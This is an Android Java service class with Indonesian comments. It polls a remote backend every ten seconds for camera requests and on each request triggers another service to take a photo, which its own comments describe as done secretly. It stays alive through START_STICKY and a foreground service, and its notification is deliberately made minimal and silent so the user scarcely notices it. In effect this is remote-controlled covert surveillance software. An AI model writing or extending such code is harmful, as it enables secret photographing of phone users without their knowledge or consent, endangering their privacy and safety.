package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

/**
 * Service polling kamera yang berjalan terus di latar belakang.
 *
 * Berjalan sebagai Foreground Service sehingga tetap aktif meski:
 * - App di-minimize
 * - HP dikunci
 * - OS mencoba mematikan proses background
 *
 * Setiap POLL_INTERVAL_MS cek ke GAS apakah ada request kamera.
 * Kalau ada → langsung panggil CameraService.start() untuk
 * ambil foto secara diam-diam.
 *
 * Menggunakan START_STICKY sehingga Android me-restart service ini
 * secara otomatis jika OS terpaksa mematikannya karena memori.
 * (Tidak berlaku jika user sengaja force-stop app.)
 *
 * Catatan AndroidManifest yang wajib ditambahkan:
 *
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 *
 *   <service
 *       android:name=".CameraPollingService"
 *       android:exported="false"
 *       android:foregroundServiceType="camera"/>
 *
 * Channel notifikasi ini menggunakan IMPORTANCE_MIN supaya ikon
 * muncul sekecil mungkin di status bar dan tidak bersuara/getar.
 */
public class CameraPollingService extends Service {

    private static final String TAG             = "CameraPollingService";
    private static final String CHANNEL_ID      = "camera_polling";
    private static final int    NOTIFICATION_ID = 3000;

    // Interval polling normal (10 detik)
    private static final long POLL_INTERVAL_MS = 10_000L;

    // Interval setelah request ditemukan — beri waktu
    // CameraService selesai sebelum polling lagi
    private static final long POLL_AFTER_CAPTURE_MS = 15_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling = false;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Jalankan sebagai foreground service dengan notifikasi minimal
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            // Mulai polling segera
            pollHandler.post(pollRunnable);
        }

        // START_STICKY: Android restart service ini otomatis
        // jika terpaksa dimatikan karena memori
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        new Thread(() -> {

            try {
                JSONObject result =
                        ApiHelper.getPendingCameraRequest();

                if (result == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                if (!"success".equalsIgnoreCase(
                        result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request =
                        result.optJSONObject("request");

                if (request == null) {
                    // Tidak ada request pending — polling normal
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId =
                        request.optString("id", "");
                String camera =
                        request.optString("camera", "front");

                if (requestId.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG,
                        "Request kamera ditemukan: "
                                + requestId
                                + " | kamera=" + camera
                );

                // Jalankan CameraService untuk ambil foto
                CameraService.start(
                        getApplicationContext(),
                        requestId,
                        camera
                );

                // Polling lebih lambat setelah request ditemukan —
                // beri waktu CameraService selesai ambil & upload
                scheduleNextPoll(POLL_AFTER_CAPTURE_MS);

            } catch (Exception e) {
                Log.e(TAG, "Error saat polling", e);
                // Tetap lanjutkan polling meski ada error
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // NOTIFIKASI (wajib untuk foreground service)
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Myapk",
                    // IMPORTANCE_MIN: ikon sekecil mungkin,
                    // tidak muncul di lockscreen, tidak bersuara
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);

            NotificationManager nm =
                    getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_camera)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    /**
     * Mulai CameraPollingService.
     * Panggil dari MainActivity.onCreate() dan dari mana saja
     * yang ingin memastikan polling berjalan.
     */
    public static void start(Context context) {
        Intent intent =
                new Intent(context, CameraPollingService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    /**
     * Hentikan CameraPollingService secara eksplisit.
     * Biasanya tidak perlu dipanggil — biarkan terus jalan.
     */
    public static void stop(Context context) {
        context.stopService(
                new Intent(context, CameraPollingService.class)
        );
    }
}
